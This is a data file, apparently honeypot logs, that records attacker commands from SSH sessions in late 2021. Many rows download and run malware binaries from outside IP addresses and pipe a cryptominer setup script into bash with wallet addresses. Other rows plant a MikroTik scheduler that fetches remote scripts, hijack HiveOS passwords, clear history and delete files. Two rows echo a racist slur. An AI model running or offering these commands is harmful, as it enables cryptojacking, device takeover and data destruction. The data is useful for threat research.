@@ -1,0 +1,52 @@
+attackdate,attackerip,entrancetime,exittime,commands
+2021-10-28,10.0.3.145,23:46:00.580,23:58:59.364,"['rm x86_64', 'wget http://205.185.121.185/x86_64', 'chmod 777 *', './x86_64 fw.x86', 'rm x86_64', 'curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 42TEc4whDKN4EoNkKVeaBQNYkcNpnnP8q9W3GTpou8EGHvRMvqomgGTKxvPfgUuE2FZ6uGYGC31oKRHaAfzWgX3a1pqai7Z']"
+2021-10-30,10.0.3.89,23:16:46.146,23:54:43.441,"['rm x86_64', 'wget http://205.185.121.185/x86_64', 'chmod 777 *', './x86_64 fw.x86', 'rm x86_64', 'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43FfsvebfiL9x6uHd7nc1RfLBDp8ASCfgiNLUfQxV8GtJVqdcX4brm3MiYcm2zgVRmbZoYPdn5YzgDG6ZMbRmq4x2nK337X']"
+2021-11-05,10.0.3.92,23:49:36.971,23:49:55.477,['scp -t -- /tmp/AYNgNWMI']
+2021-11-06,10.0.3.38,00:22:14.283,00:22:48.919,[]
+2021-10-30,10.0.3.84,00:33:41.557,00:58:01.298,"['/system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://myfrance.xyz/poll/a74c6964-3f8c-43ad-a0cb-eeb7d760ebf0 mode=http dst-path=7wmp0b4s.rsc\\r\\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write']"
+2021-10-29,10.0.3.7,01:08:46.790,01:15:59.307,[]
+2021-11-08,10.0.3.89,01:42:16.701,01:42:37.285,['scp -t /tmp/yF9kMut8']
+2021-11-07,10.0.3.216,02:03:47.332,02:04:09.040,['scp -t /tmp/zZt5IgdF']
+2021-10-31,10.0.3.124,02:46:22.908,02:46:23.356,[]
+2021-11-10,10.0.3.84,02:53:35.326,02:57:41.932,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-10-29,10.0.3.119,03:08:48.858,03:08:50.821,[]
+2021-10-31,10.0.3.95,04:09:47.157,04:46:17.208,['/ip cloud print']
+2021-11-03,10.0.3.24,05:28:02.278,05:28:25.246,['scp -t /tmp/aLobI8ez']
+2021-11-10,10.0.3.108,05:27:12.967,05:27:49.836,"['sudo hive-passwd damn123$%adsa#%aFasaaaaaa', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-10-29,10.0.3.76,05:08:25.837,05:54:48.071,[]
+2021-10-29,10.0.3.79,06:13:30.218,06:53:23.185,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg']"
+2021-11-07,10.0.3.173,07:20:39.959,07:22:11.853,['scp -t /tmp/zVHWGvJs']
+2021-10-29,10.0.3.121,08:14:03.396,08:58:42.409,['sudo hive-passwd dayone1edfjqiyhnh3']
+2021-10-31,10.0.3.164,08:23:06.607,08:24:19.664,[]
+2021-11-01,10.0.3.116,08:11:28.303,08:14:20.020,['sudo hive-passwd dayonef1edfujqicyhnyh1okugyllus12']
+2021-10-29,10.0.3.170,09:22:55.000,09:49:56.523,[]
+2021-11-01,10.0.3.166,09:42:23.385,10:00:00.848,['scp -t /tmp/2jjfU1TT']
+2021-10-29,10.0.3.97,11:14:20.284,11:49:33.790,"['sudo hive-passwd dayone1edfjqiyhnh1', 'sudo pkill Xorg']"
+2021-11-06,10.0.3.92,11:40:37.385,11:40:57.210,['scp -t /tmp/tNyFUeAL']
+2021-10-29,10.0.3.146,12:36:16.233,12:36:41.367,['scp -t /tmp/SNK0FfLp']
+2021-10-30,10.0.3.61,13:26:14.558,13:51:48.304,"['rm x86_64', 'wget http://205.185.121.185/x86_64', 'chmod 777 *', './x86_64 fw.x86', 'rm x86_64', 'curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 49fJJBi8TxsGB8KB4WCg2ZWNtQNCvAMB4HYkwS31HfVWJwvx5xQw3rpYx7M635ew5TZy4YK5HkLVoJCdE2X57LQiGfy6SgF']"
+2021-11-07,10.0.3.189,14:08:28.450,14:08:47.283,['scp -t /tmp/XWzafofo']
+2021-11-01,10.0.3.135,14:11:27.249,14:12:59.805,[]
+2021-11-04,10.0.3.73,15:54:33.096,15:55:01.169,['scp -t /tmp/9clDu0QC']
+2021-11-03,10.0.3.67,16:53:44.761,16:54:13.992,['scp -t /tmp/R5iMym0X']
+2021-10-29,10.0.3.123,17:50:37.140,17:54:43.573,"['cat /etc/issue', 'cd /tmp/', 'rm -rf x86*', 'wget http://198.98.62.92/x86_64', 'chmod 777 *', './x86_64 x86xhed', 'echo hraztalag on top niggers, Molov is a fag']"
+2021-10-30,10.0.3.39,17:54:19.780,17:59:11.480,"['sudo hive-passwd upu2B8Hed2dy8i6XYF7', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-03,10.0.3.76,18:27:28.063,18:28:08.062,['scp -t /tmp/1ZS72hLG']
+2021-11-07,10.0.3.183,19:23:59.253,19:24:19.757,['scp -t /tmp/GNbGzy0e']
+2021-10-28,10.0.3.48,19:10:31.984,19:57:02.175,"['cat /etc/issue', 'cd /tmp/', 'rm -rf x86*', 'wget http://198.98.62.92/x86_64', 'chmod 777 *', './x86_64 x86xhed', 'echo hraztalag on top niggers, Molov is a fag']"
+2021-11-10,10.0.3.197,19:48:35.580,19:50:26.030,['scp -t /tmp/8Gq7B0Ia']
+2021-11-08,10.0.3.20,20:10:47.972,20:11:11.299,['scp -t /tmp/gYGGR74y']
+2021-10-28,10.0.3.105,20:14:01.353,20:28:13.254,[]
+2021-10-30,10.0.3.31,20:36:27.966,20:36:55.318,"['sudo hive-passwd upu2B8Hed2dy8i6XYF7', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-01,10.0.3.43,20:12:55.725,20:13:15.191,['scp -t /tmp/zKuGCAFI']
+2021-11-09,10.0.3.124,20:46:49.848,20:58:25.080,['scp -t /tmp/SiwEFlua']
+2021-11-10,10.0.3.58,20:54:14.555,20:54:37.562,['scp -t /tmp/BuqcLmIH']
+2021-11-10,10.0.3.83,21:03:31.718,21:29:32.871,[]
+2021-10-28,10.0.3.148,21:49:24.792,21:49:25.480,"['cd /tmp  cd /var/run  cd /mnt  cd /root  cd /', 'wget http://192.3.185.234/run.sh', 'curl -O http://192.3.185.234/run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp 192.3.185.234 -c get run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp -r run2.sh -g 192.3.185.234', 'chmod 777 run2.sh', 'sh run2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 192.3.185.234 run1.sh run1.sh', 'sh run1.sh', 'rm -rf run.sh run.sh run2.sh run1.sh', 'rm -rf *']"
+2021-10-31,10.0.3.102,21:32:51.485,21:58:51.473,"['rm x86_64', 'wget http://205.185.121.185/x86_64', 'chmod 777 *', './x86_64 fw.x86', 'rm x86_64']"
+2021-11-08,10.0.3.149,21:52:10.450,21:54:28.576,"['ls', 'sudo ls', 'ftuf', '[ETX]ls', 'cd /home', 'ls', 'cd C[TAB]', 'ls', 'cat i[TAB]07[TAB]', 'exexit']"
+2021-11-08,10.0.3.77,22:06:32.055,22:06:41.259,['/ip cloud print']
+2021-11-10,10.0.3.127,22:08:35.069,22:28:36.262,"['wget dawis.tw/x86_64', 'wget dawis.tw/i686', 'wget dawis.tw/arm', 'wget dawis.tw/arc', 'wget dawis.tw/arm5', 'wget dawis.tw/arm6', 'wget dawis.tw/arm7', 'wget dawis.tw/i586', 'wget dawis.tw/mips', 'wget dawis.tw/mipsel', 'wget dawis.tw/sh4', 'chmod 777 *', './arc x86', './arm x86', './arm5 x86', './arm6 x86', './arm7 x86', './i586 x86', './i686 x86', './mips x86', './mipsel x86', './sh4 x86', './x86_64 x86;']"
+2021-10-28,10.0.3.168,22:15:47.785,22:52:12.899,[]
+2021-10-30,10.0.3.7,22:11:13.882,22:11:15.686,['/ip cloud print']
+2021-11-07,10.0.3.200,22:42:27.407,22:52:52.365,[]
